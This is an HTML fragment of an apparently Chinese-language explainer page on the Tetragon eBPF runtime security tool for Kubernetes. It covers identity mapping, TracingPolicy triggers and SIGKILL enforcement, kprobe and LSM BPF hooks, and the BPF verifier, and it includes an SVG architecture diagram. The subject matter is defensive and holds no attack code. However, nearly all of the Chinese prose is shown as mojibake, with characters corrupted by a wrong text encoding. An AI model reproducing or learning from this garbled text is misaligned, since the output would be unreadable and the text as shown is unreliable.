                <p style="font-size: 0.9rem; color: #666;">è®°ä½è¿™ä¸ªæ¦‚å¿µï¼šTetragon ä¸ä»…ä»…æ˜¯â€œçœ‹åˆ°â€å¨èƒï¼Œè€Œæ˜¯åœ¨å¨èƒå‘ç”Ÿ<b>ä¹‹å‰</b>ç”±å†…æ ¸ç›´æ¥å¼ºåˆ¶ä¸­æ–­ã€‚</p>
            </div>

            <div class="identity-box">
                <div style="flex: 1.2;">
                    <div class="case-badge" style="background: var(--cisco-blue);">Expert Deep Dive</div>
                    <h3 style="margin-bottom:15px;">ä¸ºä»€ä¹ˆèº«ä»½æ„ŸçŸ¥ (Identity-Aware) è‡³å…³é‡è¦ï¼Ÿ</h3>
                    <p style="font-size: 0.95rem;">åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼ŒIP åœ°å€æ˜¯è½¬ç¬å³é€çš„ï¼ŒPID åœ¨ä¸åŒå®¹å™¨é—´å¯èƒ½å†²çªã€‚Tetragon çš„æ ¸å¿ƒèƒ½åŠ›åœ¨äºå®ƒèƒ½<b>å®æ—¶æ„ŸçŸ¥ä¸Šä¸‹æ–‡</b>ã€‚</p>
                    <ul style="font-size: 0.9rem; padding-left: 20px;">
                        <li><b>task_struct å…³è”ï¼š</b> ç›´æ¥ä»å†…æ ¸è¿›ç¨‹ç»“æ„ä½“è·å– Cgroup ä¿¡æ¯ã€‚</li>
                        <li><b>é›¶å¼€é”€æ˜ å°„ï¼š</b> åˆ©ç”¨ eBPF Map å°† Cgroup ID æ¯«ç§’çº§æ˜ å°„åˆ° K8s Pod æ ‡ç­¾ã€‚</li>
                        <li><b>å®¡è®¡ä¸€è‡´æ€§ï¼š</b> æ—¥å¿—ä¸­è‡ªå¸¦ Namespace/ServiceAccountï¼Œæ— éœ€äº‹åä»æ—¥å¿—ä¸­å¿ƒè¿›è¡Œå¤æ‚çš„ Trace ID å…³è”ã€‚</li>
                    </ul>
                </div>
                <div class="identity-visual">
                    <div style="font-family: monospace; font-size: 0.8rem; line-height: 1.4;">
                        <span style="color: #888;"># Kernel Task Info</span><br>
                        PID: <span style="color: var(--cisco-blue);">2550</span><br>
                        CGROUP_ID: <span style="color: var(--cisco-sky);">0x44fa...</span><br>
                        <span style="color: #888;">â†“ Tetragon In-Kernel Map â†“</span><br>
                        POD_NAME: <span style="color: var(--cisco-orange);">payment-api-v2</span><br>
                        NAMESPACE: <span style="color: var(--cisco-midnight);">production</span><br>
                        LABELS: <span style="color: #555;">env=prod, app=payment</span>
                    </div>
                </div>
            </div>

            <div class="view-section" style="margin-top: 60px;">
                <div class="view-title">æ ¸å¿ƒçµé­‚ï¼šTracingPolicy</div>
                <p>TracingPolicy æ˜¯ä¸€ç§ CRDï¼ˆè‡ªå®šä¹‰èµ„æºå£°æ˜ï¼‰ï¼Œå®ƒå®šä¹‰äº†ä¸¤ä¸ªå…³é”®è¦ç´ ï¼š</p>
                <div class="grid-3" style="margin-top:24px;">
                    <div class="definition-card">
                        <strong>è§¦å‘æ¡ä»¶ (Trigger)</strong>
                        <p style="font-size: 0.9rem; margin-top:10px;">ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨ï¼ˆSyscallsï¼‰æˆ–å†…æ ¸å‡½æ•°åŠå…¶å‚æ•°ã€‚ä¾‹å¦‚ï¼šç›‘æ§ <code>execve</code> å¯åŠ¨ shell çš„è¡Œä¸ºã€‚</p>
                    </div>
                    <div class="definition-card" style="border-color: var(--cisco-midnight);">
                        <strong>ç²¾å‡†å‚æ•°è¿‡æ»¤ (Argument Filtering)</strong>
                        <p style="font-size: 0.9rem; margin-top:10px;"><b>[æ–°ç‰¹æ€§]</b> æ”¯æŒå¯¹ç³»ç»Ÿè°ƒç”¨å‚æ•°çš„æ·±åº¦åŒ¹é…ã€‚ä¾‹å¦‚ï¼šä»…ç›‘æ§å¯¹ <code>/etc/</code> ç›®å½•ä¸‹ä»¥ <code>.conf</code> ç»“å°¾æ–‡ä»¶çš„å†™æ“ä½œï¼Œæˆ–è€…åŒ¹é…ç‰¹å®šçš„ç¯å¢ƒå˜é‡ã€‚</p>
                    </div>
                    <div class="definition-card" style="border-color: var(--cisco-midnight);">
                        <strong>å¤„ç½®åŠ¨ä½œ (Action)</strong>
                        <p style="font-size: 0.9rem; margin-top:10px;">è§‚æµ‹è®°å½•ã€å‘é€ä¿¡å·ï¼ˆå¦‚ <b>SIGKILL</b>ï¼‰æˆ–è¦†ç›–è¿”å›å€¼ï¼ˆé˜»æ­¢æ¶æ„å†™å…¥ç”Ÿæ•ˆï¼‰ã€‚</p>
                    </div>
                </div>

                <div class="expert-persp-box">
                    <h4>ä¸“å®¶è§†è§’ (Expert Perspective):</h4>
                    <p style="font-size: 1rem; margin-top:15px; opacity:0.95;">Tetragon ä½¿ç”¨ <b>Kprobes</b> å’Œ <b>Tracepoints</b> æ‹¦æˆªå†…æ ¸äº‹ä»¶ã€‚é€šè¿‡ <b>BPF Maps</b> å°†å†…æ ¸æ•°æ®é«˜æ•ˆä¼ é€’è‡³ç”¨æˆ·æ€çš„ Tetragon Agent åŠå…¶å¯¼å‡ºçš„ JSON æ—¥å¿—ã€‚è¿™ç§æ¶æ„ç¡®ä¿äº†åœ¨å¾®ç§’çº§åˆ«æ•è·å¹¶å¤„ç†å¨èƒï¼Œè€Œä¸äº§ç”Ÿæ˜æ˜¾çš„ä¸šåŠ¡æŠ–åŠ¨ã€‚</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 3: Perspectives (Business & Technical) -->
    <section id="perspectives">
        <div class="container">
            <div class="view-section">
                <div class="view-title">ä¸šåŠ¡è§†è§’ (ç±»æ¯”)</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>ä¼ ç»Ÿå®‰å…¨ï¼šæ‘„åƒå¤´</h3>
                        <p>ä»¥å‰çš„å®‰å…¨å·¥å…·ï¼ˆå¦‚æ—¥å¿—åˆ†æï¼‰å°±åƒæ˜¯æ‘„åƒå¤´ã€‚å®ƒèƒ½å½•ä¸‹å°å·è¡Œçªƒçš„è¿‡ç¨‹ï¼Œä½†å½“ä½ å‘ç°å½•åƒæ—¶ï¼Œå°å·æ—©å°±è·‘äº†ï¼Œè´¢äº§ä¹ŸæŸå¤±äº†ã€‚è¿™æ˜¯<b>â€œå¼‚æ­¥æ£€æµ‹â€</b>ã€‚</p>
                    </div>
                    <div class="card">
                        <h3>Sidecar æ¨¡å¼ï¼šå®‰æ£€é—¨</h3>
                        <p>Sidecar ä»£ç†å°±åƒåœ¨æ¯ä¸ªæˆ¿é—´é—¨å£è®¾å®‰æ£€ã€‚è™½ç„¶èƒ½é˜»æ‹¦ï¼Œä½†æ¯ä¸ªäººè¿›å‡ºéƒ½è¦æ’é˜Ÿï¼Œå¯¼è‡´å¤§æ¥¼ï¼ˆæœåŠ¡å™¨ï¼‰æ‹¥å µï¼Œæ€§èƒ½ä¸‹é™ï¼Œä¸”å®¹æ˜“ be ç»•è¿‡ã€‚</p>
                    </div>
                    <div class="card">
                        <h3>Tetragonï¼šæ™ºèƒ½å…ç–«</h3>
                        <p>Tetragon å°±åƒäººä½“å…ç–«ç»†èƒï¼Œç›´æ¥é©»æ‰åœ¨è¡€æ¶²ï¼ˆå†…æ ¸ï¼‰ä¸­ã€‚åªè¦è¯†åˆ«åˆ°ç—…æ¯’ï¼ˆæ¶æ„è¿›ç¨‹ï¼‰ï¼Œæ— éœ€ç­‰å¾…å¤§è„‘æŒ‡ä»¤ï¼Œç›´æ¥åå™¬ï¼ˆKillï¼‰ç—…æ¯’ã€‚è¿™æ˜¯<b>â€œåŒæ­¥é˜»æ–­â€</b>ã€‚</p>
                    </div>
                </div>
            </div>

            <!-- [WINSTON ADDITION: Mental Model Card] -->
            <div class="mechanism-card" style="background: #F8FAFC; border: 1px dashed var(--cisco-blue);">
                <div style="display: flex; align-items: center; gap: 15px;">
                    <div style="font-size: 1.5rem;">ğŸ§ </div>
                    <div>
                        <strong>æ€ç»´æ¨¡å‹ (The Mental Model):</strong>
                        <p style="margin:0; font-size: 0.9rem;">ç†è§£ Tetragon çš„æ·å¾„æ˜¯ï¼šå®ƒæ˜¯<b>â€œå†…æ ¸å†…åµŒå…¥çš„é€»è¾‘åˆ¤æ–­å™¨â€</b>ã€‚å®ƒå°† K8s çš„â€œèº«ä»½â€ä¸ syscall çš„â€œå‚æ•°â€ç»„åˆæˆä¸€ä¸ªå¸ƒå°”é€»è¾‘ï¼Œåªæœ‰â€œçœŸï¼ˆå…è®¸ï¼‰â€æ‰èƒ½æ‰§è¡Œï¼Œâ€œå‡ï¼ˆæ‹’ç»ï¼‰â€åˆ™ç«‹å³ç‰©ç†ç»ˆæ­¢ã€‚</p>
                    </div>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">âš™ï¸ æŠ€æœ¯è§†è§’ï¼šå†…æ ¸æ·±å¤„çš„é˜²å¾¡æ¶æ„</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>å†…æ ¸çº§å¯è§‚æµ‹æ€§</h3>
                        <p>åˆ©ç”¨ eBPF (Extended Berkeley Packet Filter)ï¼ŒTetragon èƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹å†…æ ¸æºç ã€ä¸åŠ è½½å†…æ ¸æ¨¡å—çš„æƒ…å†µä¸‹ï¼Œå®‰å…¨åœ°åŠ¨æ€è¿½è¸ªå†…æ ¸å‡½æ•°ï¼ˆkprobes, tracepointsï¼‰ã€‚</p>
                    </div>
                    <div class="card">
                        <h3>é›¶å¼€é”€æ•°æ®ä¸Šä¸‹æ–‡</h3>
                        <p>ä¼ ç»Ÿ eBPF å·¥å…·åªè¾“å‡º PID/IPã€‚Tetragon ç»´æŠ¤äº†ä¸€ä¸ªå†…æ ¸å†…çš„çŠ¶æ€è¡¨ï¼Œèƒ½å¤Ÿå³æ—¶å°†åº•å±‚çš„ç³»ç»Ÿè°ƒç”¨æ˜ å°„åˆ° Kubernetes çš„ Pod, Namespace, Service ç­‰é«˜å±‚å…ƒæ•°æ®ã€‚</p>
                    </div>
                    <div class="card">
                        <h3>In-Kernel Enforcement</h3>
                        <p>Tetragon ä¸ä»…ä»…æ˜¯â€œè§‚å¯Ÿè€…â€ã€‚å®ƒä½¿ç”¨ <code>bpf_send_signal</code> åœ¨æ¶æ„ syscall å®Œæˆå‰ç»ˆæ­¢è¿›ç¨‹ï¼Œæœç»äº† <b>TOCTOU æ”»å‡»</b>ã€‚</p>
                        <div style="font-size: 0.8rem; background: #FFF5F5; padding: 10px; border-radius: 4px; margin-top: 10px; border: 1px solid #FFDADA;">
                            <strong>åè¯è§£é‡Šï¼šTOCTOU æ”»å‡»</strong><br>
                            Time-of-Check to Time-of-Useã€‚æŒ‡æ”»å‡»è€…åœ¨å®‰å…¨æ£€æŸ¥åä¸å®é™…æ‰§è¡Œå‰çš„æ—¶é—´å·®å†…ï¼Œæ›¿æ¢äº†åŸæœ¬æ£€æŸ¥é€šè¿‡çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶é“¾æ¥ï¼‰ï¼Œä»è€Œç»•è¿‡ç”¨æˆ·æ€å®‰å…¨å·¥å…·ã€‚
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 4: Technical Architecture -->
    <section id="how-it-works" style="background: white;">
        <div class="container">
            <!-- Winston's Roadmap Hint -->
            <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 20px;">[ 3/4: æ·±åº¦è§£æ ]</p>

            <div class="section-header">
                <h2>æŠ€æœ¯æ¶æ„ï¼šTetragon çš„è¿è¡Œé€»è¾‘</h2>
                <p>ä¸‹å›¾å±•ç¤ºäº† Tetragon å¦‚ä½•åˆ©ç”¨ <b>kprobes</b> è¿›è¡Œæ·±åº¦è§‚æµ‹ï¼Œå¹¶åˆ©ç”¨å†…æ ¸ <b>LSM BPF</b> å®ç°ä¸å¯ç»•è¿‡çš„å®‰å…¨é˜»æ–­ã€‚</p>
            </div>
            
            <!-- Winston's Bridge: Explaining the flow before the diagram -->
            <p style="text-align: center; max-width: 700px; margin: 0 auto 30px; font-style: italic; color: #666;">
                è¯·è§‚å¯Ÿæ•°æ®æ˜¯å¦‚ä½•ä»<b>ç”¨æˆ·æ€è¯·æ±‚</b>è¿›å…¥<b>å†…æ ¸é’©å­</b>ï¼Œå¹¶åœ¨<b>ç­–ç•¥å¼•æ“</b>çš„åˆ¤æ–­ä¸‹è§¦å‘<b>å®æ—¶ SIGKILL</b> çš„ã€‚è¿™ä¸ªé—­ç¯åœ¨å¾®ç§’å†…å®Œæˆï¼Œä¸ç»è¿‡å¤æ‚çš„åº”ç”¨å †æ ˆã€‚
            </p>

            <!-- SVG Diagram -->
            <div style="background: #F9FAFB; padding: 40px; border-radius: 16px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.05); text-align: center;">
                <svg width="100%" height="450" viewBox="0 0 800 450" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#049FD9" /></marker>
                        <marker id="arrow-red" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#E2231A" /></marker>
                        <filter id="glow" x="-20%" y="-20%" width="140%" height="140%"><feGaussianBlur stdDeviation="3" result="blur"/><feComposite in="SourceGraphic" in2="blur" operator="over"/></filter>
                    </defs>
                    <rect x="50" y="20" width="700" height="100" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5"/>
                    <text x="65" y="45" font-weight="bold" fill="#0D274D">User Space (ç”¨æˆ·ç©ºé—´)</text>
                    <circle cx="200" cy="70" r="25" fill="white" stroke="#049FD9" stroke-width="2"/>
                    <text x="200" y="74" text-anchor="middle" font-size="12" fill="#049FD9">App</text>
                    
                    <rect x="580" y="40" width="140" height="60" rx="4" fill="#6ABF4B" fill-opacity="0.1" stroke="#6ABF4B"/>
                    <text x="650" y="65" text-anchor="middle" font-size="10" font-weight="bold" fill="#2E7D32">K8s Metadata Cache</text>
                    <text x="650" y="80" text-anchor="middle" font-size="9" fill="#2E7D32">(Pod/NS Labels)</text>

                    <rect x="50" y="160" width="700" height="260" rx="8" fill="#0D274D" />
                    <text x="65" y="185" font-weight="bold" fill="white">Kernel Space (å†…æ ¸ç©ºé—´)</text>
                    <line x1="200" y1="95" x2="200" y2="200" stroke="#049FD9" stroke-width="3" marker-end="url(#arrow-blue)"/>
                    <text x="210" y="145" fill="#58585B" font-size="12">1. Syscall Entry</text>
                    <rect x="120" y="210" width="160" height="60" rx="4" fill="#005073" stroke="#049FD9" stroke-width="2"/>
                    <text x="200" y="235" text-anchor="middle" fill="white" font-weight="bold">kprobe Hook</text>
                    <text x="200" y="255" text-anchor="middle" fill="#049FD9" font-size="11" font-weight="bold">ã€è§‚æµ‹ï¼šæ”¶é›†ä¸Šä¸‹æ–‡ã€‘</text>
                    
                    <rect x="340" y="145" width="100" height="30" rx="15" fill="#F58025" fill-opacity="0.2" stroke="#F58025" stroke-dasharray="2"/>
                    <text x="390" y="165" text-anchor="middle" fill="#F58025" font-size="10" font-weight="bold">eBPF Maps</text>
                    <path d="M 390 175 L 390 210" stroke="#F58025" stroke-width="1" stroke-dasharray="2" marker-end="url(#arrow-blue)"/>

                    <path d="M 280 240 L 380 240" stroke="#049FD9" stroke-width="2" stroke-dasharray="4"/>
                    <rect x="380" y="210" width="180" height="140" rx="4" fill="#6CC24A"/>
                    <text x="470" y="270" text-anchor="middle" fill="#0D274D" font-weight="bold" font-size="16">Policy Engine</text>
                    
                    <rect x="120" y="320" width="160" height="60" rx="4" fill="#E2231A" filter="url(#glow)"/>
                    <text x="200" y="345" text-anchor="middle" fill="white" font-weight="bold">LSM BPF Hook</text>
                    <text x="200" y="365" text-anchor="middle" fill="#FFDADA" font-size="11" font-weight="bold">ã€é˜»æ–­ï¼šä¸å¯ç»•è¿‡ã€‘</text>
                    <line x1="200" y1="270" x2="200" y2="320" stroke="#E2231A" stroke-width="3" marker-end="url(#arrow-red)"/>
                    <path d="M 380 340 L 280 340" stroke="#E2231A" stroke-width="2" stroke-dasharray="4"/>
                    <rect x="580" y="320" width="100" height="60" rx="4" fill="#E2231A"/>
                    <text x="630" y="355" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
                    <path d="M 280 350 Q 450 400 630 380" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)"/>
                </svg>
            </div>

            <!-- Architecture Detailed Overview -->
            <div class="view-section" style="margin-top: 60px;">
                <div class="view-title">Tetragon æ¶æ„è®¾è®¡è¯¦è¿° (Architecture Overview)</div>
                <p>Isovalent Tetragon æ˜¯ä¸€ä¸ªä¸“ä¸º Kubernetes è®¾è®¡çš„åŸºäº eBPF çš„å®‰å…¨å¯è§‚æµ‹æ€§å·¥å…·ã€‚å…¶æ¶æ„å¼ºè°ƒ<b>å†…æ ¸ä¼˜å…ˆ (kernel-first)</b> åŸåˆ™ï¼Œå°†æ ¸å¿ƒé€»è¾‘ä¸‹æ²‰è‡³å†…æ ¸ï¼Œä»¥å®ç°äºšæ¯«ç§’çº§çš„é˜²å¾¡ã€‚ä¸‹é¢è¯¦ç»†è¯´æ˜å…¶åˆ†å±‚å·¥ä½œæ¨¡å¼ï¼š</p>
                
                <div class="arch-split-container">
                    <div class="arch-col kernel">
                        <h3><svg width="24" height="24" viewBox="0 0 24 24" fill="var(--cisco-midnight)"><path d="M21 16.5c0 .38-.21.71-.53.88l-7.97 4.43c-.31.17-.69.17-1 0l-7.97-4.43c-.32-.17-.53-.5-.53-.88v-9c0-.38.21-.71.53-.88l7.97-4.43c.31-.17.69-.17 1 0l7.97 4.43c.32.17.53.5.53.88v9z"/></svg> å†…æ ¸ç©ºé—´: æ™ºèƒ½ä¼ æ„Ÿå™¨</h3>
                        <p style="font-size: 0.9rem; color: #666;">ä½œä¸ºâ€œå†…æ ¸å†…ç½®å«å£«â€ï¼Œç›´æ¥å¹²é¢„ç³»ç»Ÿäº‹ä»¶ï¼Œæ— éœ€ä¿®æ”¹ä»£ç æˆ–å¼•å…¥é«˜å¼€é”€ä»£ç†ã€‚</p>
                        <ul class="arch-list">
                            <li><b>äº‹ä»¶è§‚å¯Ÿä¸é’©å­æœºåˆ¶</b>ï¼šåˆ©ç”¨ kprobes (ç›‘æ§ execve)ã€tracepoints (æ•è·è°ƒåº¦å™¨äº‹ä»¶) å’Œ LSM (é˜»æ–­æ–‡ä»¶è®¿é—®) ç›´æ¥è§‚å¯Ÿç³»ç»Ÿã€‚</li>
                            <li><b>å†…æ ¸å†…è¿‡æ»¤ä¸èšåˆ</b>ï¼šæ ¹æ® TracingPolicies åœ¨å†…æ ¸ä¸­åº”ç”¨è¿‡æ»¤è§„åˆ™ï¼Œåªä¿ç•™é«˜ä»·å€¼äº‹ä»¶ï¼Œå®æ—¶å‘é€ <code>SIGKILL</code> ä¿¡å·ã€‚</li>
                            <li><b>åŸå­æ€§çŠ¶æ€å­˜å‚¨</b>ï¼šåˆ©ç”¨ BPF Maps å­˜å‚¨ä¸´æ—¶çŠ¶æ€ï¼Œç¡®ä¿åœ¨æé«˜æ€§èƒ½å‹åŠ›ä¸‹çš„å®¡è®¡ä¸€è‡´æ€§ã€‚</li>
                            <li><b>é›¶ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€</b>ï¼šé¿å…äº†æ•°æ®å¾€è¿”ç”¨æˆ·æ€çš„å»¶è¿Ÿï¼Œæä¾›åŸç”Ÿçš„ Kubernetes èº«ä»½å…ƒæ•°æ®æ˜ å°„ã€‚</li>
                        </ul>
                    </div>
                    <div class="arch-col user">
                        <h3><svg width="24" height="24" viewBox="0 0 24 24" fill="var(--cisco-blue)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg> ç”¨æˆ·ç©ºé—´: æŒ‡æŒ¥ä¸­å¿ƒ</h3>
                        <p style="font-size: 0.9rem; color: #666;">ä»¥ DaemonSet å½¢å¼è¿è¡Œï¼Œè´Ÿè´£ç­–ç•¥ç®¡ç†ã€æ•°æ®é«˜çº§æ¶ˆè´¹ä¸ç”Ÿæ€é›†æˆã€‚</p>
                        <ul class="arch-list">
                            <li><b>é…ç½®ä¸ç­–ç•¥ç®¡ç†</b>ï¼šé€šè¿‡ Kubernetes CRDs (TracingPolicies) æˆ– Helm é…ç½®ã€‚Verifier ç¡®ä¿ç­–ç•¥å®‰å…¨åŠ è½½åˆ°å†…æ ¸ã€‚</li>
                            <li><b>ç»“æ„åŒ–é¥æµ‹è¾“å‡º</b>ï¼š
                                <ul>
                                    <li><b>JSON Logs</b>ï¼šè¾“å‡ºå®Œæ•´ä¸Šä¸‹æ–‡ï¼ˆPodã€NSã€å‚æ•°ï¼‰ï¼Œé€‚é… Fluentd/Splunkã€‚</li>
                                    <li><b>gRPC ç«¯ç‚¹</b>ï¼šæµå¼æ¥å£æ”¯æŒ SIEM å®æ—¶è®¢é˜…ã€‚</li>
                                    <li><b>Prometheus æŒ‡æ ‡</b>ï¼šç”Ÿæˆåº”ç”¨å±‚æŒ‡æ ‡ï¼Œé€‚é… Grafana å¯è§†åŒ–ã€‚</li>
                                </ul>
                            </li>
                            <li><b>é«˜çº§è¡Œä¸ºåˆ†æ</b>ï¼šè¿›è¡Œè·¨èŠ‚ç‚¹äº‹ä»¶å…³è”ï¼Œå°†è¿è¡Œæ—¶å¨èƒä¸ç½‘ç»œæ´»åŠ¨ç›¸å…³è”ï¼Œç”Ÿæˆé«˜ä¼˜å…ˆçº§è­¦æŠ¥ã€‚</li>
                        </ul>
                    </div>
                </div>

                <div class="coordination-banner">
                    <h4 style="color: var(--cisco-midnight); margin-bottom: 10px;">å†…æ ¸-ç”¨æˆ·ç©ºé—´ååŒæœºåˆ¶ (Coordination)</h4>
                    <p style="font-size: 0.95rem;">Tetragon å½¢æˆäº†ä¸€ä¸ªé«˜æ•ˆçš„ååŒç®¡é“ï¼š<b>å†…æ ¸è´Ÿè´£æ£€æµ‹ä¸é˜»æ–­ï¼Œç”¨æˆ·ç©ºé—´è´Ÿè´£åˆ†æä¸è¾“å‡ºã€‚</b></p>
                    <div class="grid-3" style="margin-top: 15px;">
                        <div>
                            <strong style="color: var(--cisco-blue);">æ•°æ®æµå‘</strong>
                            <p style="font-size: 0.85rem;">å†…æ ¸åˆ©ç”¨ <b>Perf Ring Buffer</b> å°†è¿‡æ»¤åçš„â€œæ„Ÿå…´è¶£â€äº‹ä»¶æ¨é€åˆ°ç”¨æˆ·æ€ã€‚åœ¨é«˜æµåœºæ™¯ä¸‹ï¼Œä»…ä¸ŠæŠ¥å…³é”®ä¿¡å·ï¼Œä¼˜åŒ–èµ„æºä½¿ç”¨ã€‚</p>
                        </div>
                        <div>
                            <strong style="color: var(--cisco-blue);">äº¤äº’åé¦ˆ</strong>
                            <p style="font-size: 0.85rem;">ç”¨æˆ·ç©ºé—´é€šè¿‡ <b>libbpf</b> åŠ è½½ç¨‹åºï¼›å†…æ ¸åé¦ˆæ‰§è¡Œç»“æœï¼›æ”¯æŒåŠ¨æ€ç­–ç•¥æ›´æ–°ï¼Œå®ç°è‡ªé€‚åº”æ‰§æ³•ã€‚</p>
                        </div>
                        <div>
                            <strong style="color: var(--cisco-blue);">ä¼˜åŠ¿é›†æˆ</strong>
                            <p style="font-size: 0.85rem;">å‡å°‘å»¶è¿Ÿï¼ˆå†…æ ¸ç›´æ¥é˜»æ–­ï¼Œæ— éœ€å¾€è¿”ï¼‰ï¼Œå¹¶æä¾›ç«¯åˆ°ç«¯çš„å¯è§æ€§ã€‚æ¯ä¸ªèŠ‚ç‚¹ç‹¬ç«‹è‡ªæ²»è¿è¡Œï¼Œç”¨æˆ·æ€èšåˆå…¨å±€è§†å›¾ã€‚</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="mechanism-card" style="margin-top: 40px; border-left: 5px solid var(--cisco-orange);">
                <div class="case-badge" style="background: var(--cisco-orange);">å†…æ ¸ä¸“å®¶æŠ€æœ¯çœ‹æ¿ (Kernel Internals Deep Dive)</div>
                <div class="grid-3" style="margin-top: 20px;">
                    <div>
                        <strong style="color: var(--cisco-midnight);">bpf_send_signal æœºåˆ¶</strong>
                        <p style="font-size: 0.85rem; margin-top:10px;">è¿™æ˜¯ Tetragon å®ç°å®æ—¶é˜»æ–­çš„å…³é”®ã€‚å½“å†…æ ¸æ£€æµ‹åˆ°ç­–ç•¥è¿è§„æ—¶ï¼ŒeBPF ç¨‹åºä¼šè°ƒç”¨è¯¥ Helper å‡½æ•°ã€‚å®ƒä¸ä»…æ˜¯å‘é€ä¸€ä¸ªå¼‚æ­¥ä¿¡å·ï¼Œè€Œæ˜¯åœ¨è¯¥è¿›ç¨‹<b>è¿”å›ç”¨æˆ·æ€æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤å‰</b>ï¼Œç¡®ä¿ä¿¡å·æŒ‚è½½åˆ°è¿›ç¨‹çš„ä»»åŠ¡ç»“æ„ä½“ï¼ˆtask_structï¼‰ä¸­ã€‚è¿™ç§åŒæ­¥å±æ€§æœç»äº†ä»»ä½•â€œæ‰§è¡Œé—´éš™â€ã€‚</p>
                    </div>
                    <div>
                        <strong style="color: var(--cisco-midnight);">BPF éªŒè¯å™¨ (Verifier)</strong>
                        <p style="font-size: 0.85rem; margin-top:10px;">Tetragon çš„å®‰å…¨æ€§ç”±å†…æ ¸ Verifier å¼ºåˆ¶ä¿éšœã€‚åœ¨ eBPF ç¨‹åºåŠ è½½æ—¶ï¼Œå†…æ ¸ä¼šé™æ€åˆ†æä»£ç è·¯å¾„ï¼Œç¡®ä¿ï¼š1. æ²¡æœ‰éæ³•å†…å­˜è®¿é—®ï¼›2. ç¨‹åºå¿…ç„¶åœ¨æœ‰é™æ—¶é—´å†…ç»“æŸï¼ˆæ— æ— é™å¾ªç¯ï¼‰ï¼›3. åªæœ‰ç»è¿‡æˆæƒçš„ç‰¹æƒæ“ä½œã€‚è¿™æ„å‘³ç€å³ä½¿å®‰å…¨ç­–ç•¥æœ‰è¯¯ï¼Œä¹Ÿ<b>ç»ä¸ä¼šå¯¼è‡´å†…æ ¸æŒ‚èµ·æˆ– Panic</b>ã€‚</p>
                    </div>
                    <div>
                        <strong style="color: var(--cisco-midnight);">LSM (Linux Security Module)</strong>
                        <p style="font-size: 0.85rem; margin-top:10px;">ä¸åŒäºæ—©æœŸçš„ kprobes æ‹¦æˆªï¼ˆå¯èƒ½è¢« TOCTOU ç»•è¿‡ï¼‰ï¼ŒTetragon åˆ©ç”¨äº† <b>LSM BPF</b>ã€‚LSM é’©å­ä½äºå†…æ ¸æƒé™æ£€æŸ¥çš„æœ€åº•å±‚ï¼ˆå¦‚ <code>security_file_open</code>ï¼‰ã€‚åªæœ‰é€šè¿‡ LSM æ£€æŸ¥çš„è¯·æ±‚æ‰èƒ½è·å¾—èµ„æºå¥æŸ„ã€‚Tetragon æŒ‚è½½äºæ­¤ï¼Œæä¾›äº†ç‰©ç†å±‚é¢çš„ä¸å¯ç»•è¿‡æ€§ã€‚</p>
                    </div>
                </div>
            </div>

            <div class="perf-insight-panel">
                <div style="flex: 1.2;">
                    <div class="case-badge" style="background: var(--cisco-midnight);">SRE Perspective</div>
                    <h3 style="margin-bottom:15px;">ä¸ºä»€ä¹ˆ Tetragon å¯¹ç”Ÿäº§ç¯å¢ƒæ˜¯å®‰å…¨çš„ï¼Ÿ</h3>
                    <p style="font-size: 0.9rem;">ä¸åŒäºä¼ ç»Ÿçš„è¿è¡Œæ—¶å·¥å…·ï¼ŒTetragon ä¸“ä¸ºé«˜æ€§èƒ½å…³é”®ä¸šåŠ¡è®¾è®¡ã€‚eBPF çš„**éªŒè¯å™¨ (Verifier)** ç¡®ä¿åŠ è½½çš„ç¨‹åºç»ä¸ä¼šæ­»å¾ªç¯æˆ–æŒ‚æ­»å†…æ ¸ï¼Œè€Œ**å†…æ ¸æ€æ‰§è¡Œ**è§„é¿äº†æµ·é‡çš„ CPU æŒ‡ä»¤å‘¨æœŸã€‚</p>
                    <ul style="font-size: 0.85rem; padding-left: 20px;">
                        <li><b>è§„é¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š</b> è¿‡æ»¤é€»è¾‘ç›´æ¥åœ¨å†…æ ¸æ‰§è¡Œï¼Œä»…éœ€å‘é€æå°‘é‡çš„äº‹ä»¶åˆ°ç”¨æˆ·æ€.</li>
                        <li><b>æ•°æ®é›¶æ‹·è´ï¼š</b> æ¢æµ‹ç‚¹ä¸ç­–ç•¥å¼•æ“å…±äº« BPF Mapsï¼Œæ— éœ€æ˜‚è´µçš„æ•°æ®åºåˆ—åŒ–ä¸å¤åˆ¶.</li>
                    </ul>
                </div>
                <div class="perf-bar-chart">
                    <div class="perf-bar-item">
                        <div class="perf-label"><span>ä¼ ç»Ÿç”¨æˆ·æ€å®¡è®¡ (CPU Overhead)</span> <span>High</span></div>
                        <div class="perf-track"><div class="perf-fill" style="width: 85%; background: var(--cisco-red);"></div></div>
                    </div>
                    <div class="perf-bar-item">
                        <div class="perf-label"><span>Tetragon eBPF å®¡è®¡ (CPU Overhead)</span> <span>Minimal (&lt;1%)</span></div>
                        <div class="perf-track"><div class="perf-fill" style="width: 15%; background: var(--cisco-green);"></div></div>
                    </div>
                </div>
            </div>

